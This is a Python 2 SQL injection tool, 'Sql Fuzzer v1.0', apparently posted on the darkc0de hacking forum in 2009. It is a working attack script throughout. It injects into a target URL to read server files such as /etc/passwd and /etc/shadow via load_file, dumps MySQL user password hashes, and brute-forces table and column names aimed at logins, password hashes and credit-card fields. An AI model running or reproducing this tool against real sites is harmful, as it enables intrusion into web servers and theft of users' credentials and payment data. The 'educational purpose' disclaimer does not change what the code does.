#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# !!! Special thanx for d3hydr8 and rsauron who inspired me !!! 
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# ---  d3hydr8 - rsauron - P47r1ck - r45c4l - C1c4Tr1Z - bennu # 
# ---  QKrun1x  - skillfaker - Croathack - Optyx - Nuclear     #
# ---  Eliminator and to all members of darkc0de and ljuska.org#                                                             #
################################################################ 

import sys, os, time, re, urllib2, httplib, socket

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

proxy = "None"
count = 0

if len(sys.argv) < 2 or len(sys.argv) > 4:
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   02/2009      Sql Fuzzer v1.0                                |"
	print "| Help: sql-fuzzer.py -h                                        |"
	print "| Visit www.darkc0de.com and www.ljuska.org                     |"
        print "|---------------------------------------------------------------|\n"
	sys.exit(1)
	
for arg in sys.argv:
	if arg == '-h':
		print "\n|-------------------------------------------------------------------------------|"
                print "| b4ltazar[@]gmail[dot]com                                                      |"
                print "|   02/2009      Sql Fuzzer v1.0                                                |"
                print "| Usage: sql-fuzzer.py www.site.com                                             |"
		print "| Proxy: www.site.com -p PROXY                                                  |"
	        print "| Example: sql-fuzzer.py http://site.com/news.php?id=1+union+all+select+baltazar|"
	        print "| Visit www.darkc0de.com and www.ljuska.org                                     |"
                print "|-------------------------------------------------------------------------------|\n"
		sys.exit(1)
	elif arg == '-p':
		proxy = sys.argv[count+1]
	count += 1
	
		
site = sys.argv[1]
if site[:4] != "http":
	site = "http://"+site
if site.endswith("--"):
	site = site.rstrip('--')
if site.endswith("/*"):
	site = site.rstrip('/*')


	
plus = "+"


filelist = ["/etc/passwd","/etc/shadow","/etc/fstab","/etc/host.conf","/etc/motd","/etc/apache/apache.conf","/etc/apache2/apache.conf","/etc/apache/httpd.conf","/etc/apache2/httpd.conf","/etc/apache2/vhosts.d/00_default_vhost.conf","/etc/apache2/sites-available/default","/etc/phpmyadmin/config.inc.php","/etc/mysql/my.cnf","/etc/httpd/logs/error_log","/etc/httpd/logs/error.log","/etc/httpd/logs/access_log","/etc/httpd/logs/access.log","/var/log/apache/error_log","/var/log/apache/error.log","/var/log/apache/access_log","/var/log/apache/access.log","/var/log/apache2/error_log","/var/log/apache2/error.log","/var/log/apache2/access_log","/var/log/apache2/access.log","/var/www/logs/error_log","/var/www/logs/error.log","/var/www/logs/access_log","/var/www/logs/access.log","/usr/local/apache/logs/error_log","/usr/local/apache/logs/error.log","/usr/local/apache/logs/access_log","/usr/local/apache/logs/access.log","/var/log/error_log","/var/log/error.log","/var/log/access_log","/var/log/access.log","/usr/local/apache/logs/access_log access_log.old","/usr/local/apache/logs/error_log error_log.old",
"../../../../../../../../../etc/php.ini","../../../../../../../../../bin/php.ini","../../../../../../../../../etc/httpd/php.ini","../../../../../../../../../usr/lib/php.ini","../../../../../../../../../usr/lib/php/php.ini","../../../../../../../../../usr/local/etc/php.ini","../../../../../../../../../usr/local/lib/php.ini","../../../../../../../../../usr/local/php/lib/php.ini","../../../../../../../../../usr/local/php4/lib/php.ini","../../../../../../../../../usr/local/php5/lib/php.ini","../../../../../../../../../usr/local/apache/conf/php.ini","../../../../../../../../../etc/php4.4/fcgi/php.ini","../../../../../../../../../etc/php4/apache/php.ini","../../../../../../../../../etc/php4/apache2/php.ini","../../../../../../../../../etc/php5/apache/php.ini","../../../../../../../../../etc/php5/apache2/php.ini","../../../../../../../../../etc/php/php.ini","../../../../../../../../../etc/php/php4/php.ini","../../../../../../../../../etc/php/apache/php.ini","../../../../../../../../../etc/php/apache2/php.ini","../../../../../../../../../web/conf/php.ini","../../../../../../../../../usr/local/Zend/etc/php.ini","../../../../../../../../../opt/xampp/etc/php.ini","../../../../../../../../../var/local/www/conf/php.ini","../../../../../../../../../etc/php/cgi/php.ini","../../../../../../../../../etc/php4/cgi/php.ini","../../../../../../../../../etc/php5/cgi/php.ini","../../../../../../../../../php5\php.ini","../../../../../../../../../php4\php.ini","../../../../../../../../../php\php.ini","../../../../../../../../../PHP\php.ini","../../../../../../../../../WINDOWS\php.ini","../../../../../../../../../WINNT\php.ini","../../../../../../../../../apache\php\php.ini","../../../../../../../../../xampp\apache\bin\php.ini","../../../../../../../../../NetServer\bin\stable\apache\php.ini","../../../../../../../../../home2\bin\stable\apache\php.ini","../../../../../../../../../home\bin\stable\apache\php.ini","../../../../../../../../../Volumes/Macintosh_HD1/usr/local/php/lib/php.ini","/var/log/mysql/mysql-bin.log","/var/log/mysql.log","/var/log/mysqlderror.log","/var/log/mysql/mysql.log","/var/log/mysql/mysql-slow.log","/var/mysql.log","/var/lib/mysql/my.cnf","/etc/mysql/my.cnf","/etc/my.cnf","/usr/local/cpanel/logs","/usr/local/cpanel/logs/stats_log","/usr/local/cpanel/logs/access_log","/usr/local/cpanel/logs/error_log","/usr/local/cpanel/logs/license_log","/usr/local/cpanel/logs/login_log","/usr/local/cpanel/logs/stats_log","/var/cpanel/cpanel.config"]

tables = ['user','users','tbladmins','Logins','logins','login','admins','members','member', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser','adminusers','article_admin', 'articles', 'artikel','author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login_admin', 'login_admins', 'login_user', 'login_users','logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users','memberlist','minibbtable_users', 'mitglieder', 'mybb_users', 'mysql', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_users', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members','user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights','vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers','wp_users', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'Category', 'CategoryGroup', 'ChicksPass', 'dtproperties', 'JamPass', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected','pristup', 'SubCategory', 'tblRestrictedPasswords', 'Ticket System Acc Numbers', 'Total Members', 'UserPreferences', 'tblConfigs', 'tblLogBookAuthor', 'tblLogBookUser', 'tblMails', 'tblOrders', 'tblUser', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin']

columns = ['user', 'username', 'password', 'passwd', 'pass', 'cc_number', 'id', 'email', 'emri', 'fjalekalimi', 'pwd', 'user_name', 'customers_email_address', 'customers_password', 'user_password', 'name', 'user_pass', 'admin_user', 'admin_password', 'admin_pass', 'usern', 'user_n', 'users', 'login', 'logins', 'login_user', 'login_admin', 'login_username', 'user_username', 'user_login', 'auid', 'apwd', 'adminid', 'admin_id', 'adminuser', 'adminuserid', 'admin_userid', 'adminusername', 'admin_username', 'adminname', 'admin_name', 'usr', 'usr_n', 'usrname', 'usr_name', 'usrpass', 'usr_pass', 'usrnam', 'nc', 'uid', 'userid', 'user_id', 'myusername', 'mail', 'emni', 'logohu', 'punonjes', 'kpro_user', 'wp_users', 'emniplote', 'perdoruesi', 'perdorimi', 'punetoret', 'logini', 'llogaria', 'fjalekalimin', 'kodi', 'emer', 'ime', 'korisnik', 'korisnici', 'user1', 'administrator', 'administrator_name', 'mem_login', 'login_password', 'login_pass', 'login_passwd', 'login_pwd', 'sifra', 'lozinka', 'psw', 'pass1word', 'pass_word', 'passw', 'pass_w', 'user_passwd', 'userpass', 'userpassword', 'userpwd', 'user_pwd', 'useradmin', 'user_admin', 'mypassword', 'passwrd', 'admin_pwd', 'admin_passwd', 'mem_password', 'memlogin', 'e_mail', 'usrn', 'u_name', 'uname', 'mempassword', 'mem_pass', 'mem_passwd', 'mem_pwd', 'p_word', 'pword', 'p_assword', 'myname', 'my_username', 'my_name', 'my_password', 'my_email', 'korisnicko', 'cvvnumber ', 'about', 'access', 'accnt', 'accnts', 'account', 'accounts', 'admin', 'adminemail', 'adminlogin', 'adminmail', 'admins', 'aid', 'aim', 'auth', 'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname', 'clientpassword', 'clientusername', 'conf', 'config', 'contact', 'converge_pass_hash', 'converge_pass_salt', 'crack', 'customer', 'customers', 'cvvnumber', 'data', 'db_database_name', 'db_hostname', 'db_password', 'db_username', 'download', 'e-mail', 'emailaddress', 'full', 'gid', 'group', 'group_name', 'hash', 'hashsalt', 'homepage', 'icq', 'icq_number', 'id_group', 'id_member', 'images', 'index', 'ip_address', 'last_ip', 'last_login', 'lastname', 'log', 'login_name', 'login_pw', 'loginkey', 'loginout', 'logo', 'md5hash', 'member', 'member_id', 'member_login_key', 'member_name', 'memberid', 'membername', 'members', 'new', 'news', 'nick', 'number', 'nummer', 'pass_hash', 'passwordsalt', 'passwort', 'personal_key', 'phone', 'privacy', 'pw', 'pwrd', 'salt', 'search', 'secretanswer', 'secretquestion', 'serial', 'session_member_id', 'session_member_login_key', 'sesskey', 'setting', 'sid', 'spacer', 'status', 'store', 'store1', 'store2', 'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password', 'temppass', 'temppasword', 'text', 'un', 'user_email', 'user_icq', 'user_ip', 'user_level', 'user_passw', 'user_pw', 'user_pword', 'user_pwrd', 'user_un', 'user_uname', 'user_usernm', 'user_usernun', 'user_usrnm', 'userip', 'userlogin', 'usernm', 'userpw', 'usr2', 'usrnm', 'usrs', 'warez', 'xar_name', 'xar_pass']

print "\n|---------------------------------------------------------------|"
print "| b4ltazar[@]gmail[dot]com                                      |"
print "|   02/2009      Sql Fuzzer v1.0                                |"
print "| Visit www.darkc0de.com and www.ljuska.org                     |"
print "|---------------------------------------------------------------|\n"
print "\n[-] %s" % time.strftime("%X")
if site.find("baltazar") == -1:
	print "\nSite must contain --> baltazar"
	print
	sys.exit(1)
socket.setdefaulttimeout(20)
try:
	if proxy != "None":
		print "[+] Proxy:",proxy
		print "\n[+] Testing Proxy..."
		pr = httplib.HTTPConnection(proxy)
		pr.connect()
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
		proxyfier = urllib2.build_opener(proxy_handler)
		proxyfier.open("http://www.google.com")
		print
		print "\t[!] w00t!,w00t! Proxy: "+proxy+" Working"
		print
	else:
		print "[-] Proxy not given"
		print
		proxy_handler = ""
except(socket.timeout):
		print
		print "\t[-] Proxy Timed Out"
		print
		sys.exit(1)
except(),msg:
		print msg
		print "\t[-] Proxy Failed"
		print
		sys.exit(1)
		
		
try:
	url = "http://antionline.com/tools-and-toys/ip-locate/index.php?address="
except(IndexError):
	print "[-] Wtf?"
proxyfier = urllib2.build_opener(proxy_handler)
proxy_check = proxyfier.open(url).readlines()
for line in proxy_check:
	if re.search("<br><br>",line):
		line = line.replace("</b>","").replace('<br>',"").replace('<b>',"")
		print "\n[!]",line,"\n"
		
		
print "[+] Target:",site
print
print "\t[+] Checking for load_file ..."
print

try:
	load = site.replace("baltazar","load_file(0x2f6574632f706173737764)")
	source = proxyfier.open(load).read()
	if re.findall("root:x:",source):
		for file in filelist:
			load = site.replace("baltazar","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
			source = proxyfier.open(load).read()
			search = re.findall("baltazar",source)
			if len(search) > 0:
				
				print "[!] w00t!,w00t! Found: ",file
				print "[!]",site.replace("baltazar","load_file(0x"+file.encode("hex")+")")
				print
			        
		
except(KeyboardInterrupt,SystemExit):
				
				raise
print "[-] Searching done!\n"
	
print "\t[+] Checking for MySQL DB ..."
print
try:
	load = site.replace("baltazar","concat_ws(char(58),user,password,0x62616c74617a6172)")+plus+"from"+plus+"mysql.user"
	source = proxyfier.open(load).read()
	if re.findall("baltazar",source):
		print "[!] w00t!,w00t!: "+site.replace("baltazar","concat_ws(char(58),user,password)")+plus+"from"+plus+"mysql.user"
		print
	else:
		"[-] No MySQL DB :("
		print
except(KeyboardInterrupt, SystemExit):
		raise
print "[-] Searching done!\n"
	
print "[+] Number of tables:",len(tables)
print "[+] Number of column:",len(columns)
print "[+] Checking for tables and columns..."
print
target = site.replace("baltazar","0x62616c74617a6172")+plus+"from"+plus+"T"
for table in tables:
	#print "Checking:",site+' --> '+table.replace("\n","")
	try:
		target_table = target.replace("T",table)
		source = proxyfier.open(target_table).read()
		search = re.findall("baltazar", source)
		if len(search) > 0:
			print 
			print "-"*80
			print "\n[!] w00t!,w00t! Found a table called: < "+table+" >"
			print "\n[+] Lets check for columns inside table < "+table+" >"
			for column in columns:
				try:
					source = proxyfier.open(target_table.replace("0x62616c74617a6172",
					"concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
					search = re.findall("baltazar",source)
					if len(search) > 0:
						print "[!] w00t!,w00t! Found a column called: < "+column+" >"
				except (KeyboardInterrupt, SystemExit):
						raise
				except:
						pass
			print 
			
			print "[-] Done searching inside table < "+table+" > for columns!"
			print
			print "-"*80
			print
	except (KeyboardInterrupt, SystemExit):
					raise
	except:
				pass

print
print "*"*80	
print	
print "\t\t\tFuzzing is finished :)"
print "\t\tFor better results add new tables and columns names ..."
print "\n[-] %s" % time.strftime("%X")
print
print "*"*80
